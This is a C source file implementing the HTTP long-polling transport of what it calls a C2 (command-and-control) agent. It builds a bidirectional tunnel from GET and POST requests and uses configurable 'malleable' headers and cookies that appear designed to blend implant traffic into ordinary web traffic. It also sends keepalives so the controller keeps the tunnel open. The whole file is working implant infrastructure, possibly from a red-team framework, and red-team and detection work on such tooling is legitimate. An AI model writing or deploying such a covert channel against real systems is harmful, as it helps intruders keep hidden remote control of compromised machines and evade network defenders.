/*
 * http_poll.c — the default C2 channel.
 *
 * One virtual bidirectional stream is simulated over request/response HTTP:
 * init POST -> GET long-polls (reads) -> POSTs (writes) -> close POST. Routing
 * is still carried in MsgAuth, never in the URL, so the channel is just a byte
 * pipe and SecureConn does the framing.
 *
 * The SSL stack is not here: every request goes through http_client.h, whose
 * provider (libcurl, mbedTLS, raw sockets, ...) is selected at build time. This
 * file is only the http_poll state machine.
 */

#define _POSIX_C_SOURCE 200809L

#include "transport.h"

#include "http_client.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

/* ------------------------------------------------------------------------- */
/* Header building                                                            */
/* ------------------------------------------------------------------------- */

typedef struct {
  char **lines;
  size_t count;
  size_t cap;
} hdr_list;

/* Per-stream state. Defined here because build_headers() needs it. */
typedef struct {
  char *url;
  c2_http_profile profile; /* strings borrowed from the agent config */
  char session[40];
  uint8_t *pending;
  size_t plen;
  size_t poff;
  const c2_str *ca_pem;
} hp_ctx;

static void hdr_free(hdr_list *h) {
  for (size_t i = 0; i < h->count; i++)
    free(h->lines[i]);
  free(h->lines);
  h->lines = NULL;
  h->count = h->cap = 0;
}

static int hdr_push(hdr_list *h, char *line) {
  if (h->count == h->cap) {
    size_t cap = h->cap ? h->cap * 2 : 8;
    char **nl = (char **)realloc(h->lines, cap * sizeof(char *));
    if (nl == NULL)
      return -1;
    h->lines = nl;
    h->cap = cap;
  }
  h->lines[h->count++] = line;
  return 0;
}

/* Case-insensitive equality without <strings.h>, whose name would collide with
 * the project's freestanding strings.h on the include path. */
static int ci_eq(const char *a, const char *b) {
  while (*a && *b) {
    char x = *a++;
    char y = *b++;
    if (x >= 'A' && x <= 'Z')
      x = (char)(x + 32);
    if (y >= 'A' && y <= 'Z')
      y = (char)(y + 32);
    if (x != y)
      return 0;
  }
  return *a == '\0' && *b == '\0';
}

static void sleep_ms(long ms) {
  struct timespec ts;
  ts.tv_sec = ms / 1000;
  ts.tv_nsec = (ms % 1000) * 1000000L;
  nanosleep(&ts, NULL);
}

/* Expand "%s" in a malleable value with the session id. */
static void fmt_value(c2_str in, const char *session, char *out, size_t cap) {
  size_t o = 0;
  for (size_t i = 0; i < in.len && o + 1 < cap; i++) {
    if (in.ptr[i] == '%' && i + 1 < in.len && in.ptr[i + 1] == 's') {
      for (const char *s = session; *s && o + 1 < cap; s++)
        out[o++] = *s;
      i++;
    } else {
      out[o++] = in.ptr[i];
    }
  }
  out[o] = '\0';
}

/* Append one header, merging Cookie values with "; ". */
static int add_header(hdr_list *h, c2_str name, c2_str value,
                      const char *session, char *cookie, size_t cookie_cap) {
  if (name.len == 0 || name.ptr == NULL)
    return 0;
  char nbuf[64];
  if (name.len >= sizeof(nbuf))
    return 0;
  memcpy(nbuf, name.ptr, name.len);
  nbuf[name.len] = '\0';

  char vbuf[1024];
  fmt_value(value, session, vbuf, sizeof(vbuf));

  if (ci_eq(nbuf, "Cookie")) {
    size_t used = strlen(cookie);
    size_t add = strlen(vbuf);
    if (used + (used ? 2 : 0) + add + 1 < cookie_cap) {
      if (used) {
        memcpy(cookie + used, "; ", 2);
        used += 2;
      }
      memcpy(cookie + used, vbuf, add + 1);
    }
    return 0;
  }

  size_t nlen = strlen(nbuf), vlen = strlen(vbuf);
  char *line = (char *)malloc(nlen + 2 + vlen + 1);
  if (line == NULL)
    return -1;
  memcpy(line, nbuf, nlen);
  line[nlen] = ':';
  line[nlen + 1] = ' ';
  memcpy(line + nlen + 2, vbuf, vlen + 1);
  if (hdr_push(h, line) != 0) {
    free(line);
    return -1;
  }
  return 0;
}

/* Build the header list for one request. kind: 0 = GET, 1 = write POST,
 * 2 = init POST, 3 = close POST. */
static int build_headers(const hp_ctx *h, int kind, hdr_list *out) {
  char cookie[1024];
  cookie[0] = '\0';
  const c2_http_profile *p = &h->profile;
  for (size_t i = 0; i < p->header_count; i++)
    if (add_header(out, p->header_keys[i], p->header_values[i], h->session,
                   cookie, sizeof(cookie)) != 0)
      return -1;
  if (add_header(out, p->session_header, p->session_value, h->session, cookie,
                 sizeof(cookie)) != 0)
    return -1;
  if (kind == 2 &&
      add_header(out, p->init_header, p->init_value, h->session, cookie,
                 sizeof(cookie)) != 0)
    return -1;
  if (kind == 3 &&
      add_header(out, p->close_header, p->close_value, h->session, cookie,
                 sizeof(cookie)) != 0)
    return -1;
  if (cookie[0]) {
    size_t cl = strlen(cookie);
    char *line = (char *)malloc(cl + 8 + 1);
    if (line == NULL)
      return -1;
    memcpy(line, "Cookie: ", 8);
    memcpy(line + 8, cookie, cl + 1);
    if (hdr_push(out, line) != 0) {
      free(line);
      return -1;
    }
  }
  return 0;
}

/* ------------------------------------------------------------------------- */
/* Streaming state                                                             */
/* ------------------------------------------------------------------------- */

static int pending_append(hp_ctx *h, const uint8_t *data, size_t len) {
  if (len == 0)
    return 0;
  size_t avail = h->plen - h->poff;
  uint8_t *nb = (uint8_t *)realloc(h->pending, avail + len);
  if (nb == NULL)
    return -1;
  h->pending = nb;
  if (h->poff)
    memmove(h->pending, h->pending + h->poff, avail);
  memcpy(h->pending + avail, data, len);
  h->plen = avail + len;
  h->poff = 0;
  return 0;
}

static int hp_request(hp_ctx *h, int kind, const uint8_t *body, size_t body_len,
                      uint8_t *resp, size_t resp_cap, size_t *resp_len,
                      long *status) {
  *resp_len = 0;
  *status = 0;

  hdr_list headers = {0};
  if (build_headers(h, kind, &headers) != 0) {
    hdr_free(&headers);
    return -1;
  }

  c2_http_request req;
  memset(&req, 0, sizeof(req));
  req.url = h->url;
  req.method = (kind == 0) ? "GET" : "POST";
  req.headers = (const char *const *)headers.lines;
  req.header_count = headers.count;
  req.body = body;
  req.body_len = body_len;
  req.resp = resp;
  req.resp_cap = resp_cap;
  req.resp_len = resp_len;
  req.status = status;
  req.timeout_s = (kind == 0) ? 90 : 30;
  req.ca_pem = h->ca_pem;

  c2_status st = c2_http_client_perform(&req);
  hdr_free(&headers);
  return st == C2_OK ? 0 : -1;
}

/* ---- c2_stream ops ---- */

static long hp_read(void *ctx, uint8_t *buf, size_t cap) {
  hp_ctx *h = (hp_ctx *)ctx;
  uint8_t *resp = (uint8_t *)malloc(64u * 1024u);
  if (resp == NULL)
    return C2_ERR_NOMEM;
  for (;;) {
    if (h->poff < h->plen) {
      size_t n = h->plen - h->poff;
      if (n > cap)
        n = cap;
      memcpy(buf, h->pending + h->poff, n);
      h->poff += n;
      if (h->poff == h->plen)
        h->poff = h->plen = 0;
      free(resp);
      return (long)n;
    }
    size_t rlen = 0;
    long status = 0;
    if (hp_request(h, 0, NULL, 0, resp, 64u * 1024u, &rlen, &status) != 0) {
      sleep_ms(200); /* transient network error: back off and retry */
      continue;
    }
    if (status == 404) {
      /* The server closed the stream (the Go channel wrapper treats 404 as a
       * clean end of stream). Signal EOF so a download finishes normally and
       * a dead message tunnel reconnects. */
      free(resp);
      return 0;
    }
    if (status != 200) {
      free(resp);
      return C2_ERR_IO;
    }
    if (rlen > 0) {
      if (pending_append(h, resp, rlen) != 0) {
        free(resp);
        return C2_ERR_NOMEM;
      }
      continue;
    }
    /* Empty long-poll: hand control back so the agent can send a keepalive
     * (the C2 drops a silent tunnel after handshakeTimeout). */
    free(resp);
    return C2_STREAM_IDLE;
  }
}

static long hp_write(void *ctx, const uint8_t *buf, size_t len) {
  hp_ctx *h = (hp_ctx *)ctx;
  uint8_t *resp = (uint8_t *)malloc(64u * 1024u);
  if (resp == NULL)
    return C2_ERR_NOMEM;
  size_t rlen = 0;
  long status = 0;
  int rc = hp_request(h, 1, buf, len, resp, 64u * 1024u, &rlen, &status);
  if (rc != 0 || status != 200) {
    free(resp);
    return C2_ERR_IO;
  }
  /* A write response may carry read-side data; queue it. */
  if (rlen > 0 && pending_append(h, resp, rlen) != 0) {
    free(resp);
    return C2_ERR_NOMEM;
  }
  free(resp);
  return (long)len;
}

static void hp_close(void *ctx) {
  hp_ctx *h = (hp_ctx *)ctx;
  if (h == NULL)
    return;
  uint8_t *resp = (uint8_t *)malloc(4096);
  if (resp != NULL) {
    size_t rlen = 0;
    long status = 0;
    (void)hp_request(h, 3, NULL, 0, resp, 4096, &rlen, &status);
    free(resp);
  }
  free(h->pending);
  free(h->url);
  free(h);
}

static const c2_stream_ops hp_ops = {hp_read, hp_write, hp_close};

static c2_status hp_open(void *ctx, const char *url,
                         const c2_http_profile *profile, c2_stream *out) {
  if (url == NULL || profile == NULL || out == NULL)
    return C2_ERR_ARG;

  hp_ctx *h = (hp_ctx *)calloc(1, sizeof(*h));
  if (h == NULL)
    return C2_ERR_NOMEM;
  h->ca_pem = (const c2_str *)ctx;
  size_t ulen = strlen(url);
  h->url = (char *)malloc(ulen + 1);
  if (h->url == NULL) {
    free(h);
    return C2_ERR_NOMEM;
  }
  memcpy(h->url, url, ulen + 1);
  h->profile = *profile;

  /* Session id is not secret, but it must be unique per stream: a fixed value
   * would collide with the check-in stream's server-side session and let one
   * stream's close tear down another. Use the kernel CSPRNG. */
  uint8_t rnd[16];
  size_t got = 0;
  FILE *urandom = fopen("/dev/urandom", "rb");
  if (urandom != NULL) {
    got = fread(rnd, 1, sizeof(rnd), urandom);
    fclose(urandom);
  }
  if (got != sizeof(rnd)) {
    /* Fallback: mix the clock so two streams still differ. */
    struct timespec ts;
    clock_gettime(CLOCK_MONOTONIC, &ts);
    for (size_t i = 0; i < sizeof(rnd); i++)
      rnd[i] = (uint8_t)((ts.tv_nsec >> (i % 8)) ^ (i * 31u + 7u));
  }
  c2_hex_encode(rnd, sizeof(rnd), h->session);

  /* Init POST establishes the virtual stream. */
  uint8_t *resp = (uint8_t *)malloc(4096);
  if (resp == NULL) {
    free(h->url);
    free(h);
    return C2_ERR_NOMEM;
  }
  size_t rlen = 0;
  long status = 0;
  int rc = hp_request(h, 2, NULL, 0, resp, 4096, &rlen, &status);
  free(resp);
  if (rc != 0 || status != 200) {
    free(h->url);
    free(h);
    return C2_ERR_IO;
  }

  out->ops = &hp_ops;
  out->ctx = h;
  return C2_OK;
}

static const c2_transport_ops hp_transport_ops = {hp_open};

c2_transport c2_transport_create(const c2_agent_config *cfg) {
  c2_transport t;
  t.ops = &hp_transport_ops;
  t.ctx = (void *)(cfg ? &cfg->ca_pem : NULL);
  return t;
}

const char *c2_transport_name(void) { return "http_poll"; }
